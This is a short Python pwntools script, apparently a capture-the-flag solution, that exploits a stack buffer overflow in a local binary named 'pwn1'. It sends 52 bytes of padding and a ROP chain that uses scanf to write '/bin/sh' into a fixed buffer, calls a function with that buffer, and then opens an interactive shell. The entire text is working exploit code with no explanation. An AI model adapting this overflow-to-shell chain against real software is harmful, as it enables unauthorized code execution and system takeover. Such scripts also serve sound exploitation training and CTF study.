from pwn import *

def packAll(rop):
    return flat([p32(x) for x in rop])

r = process('./pwn1')
e = ELF('./pwn1')
fmt = 0x8048629
buf = 0x804a048
pp = 0x080485ee

rop = [e.plt['__isoc99_scanf'], pp, fmt, buf]
rop += [0x0804852a, buf]

r.sendlineafter('pwn test\n', 'A'*52+packAll(rop))
r.sendline('/bin/sh\x00')
r.interactive()

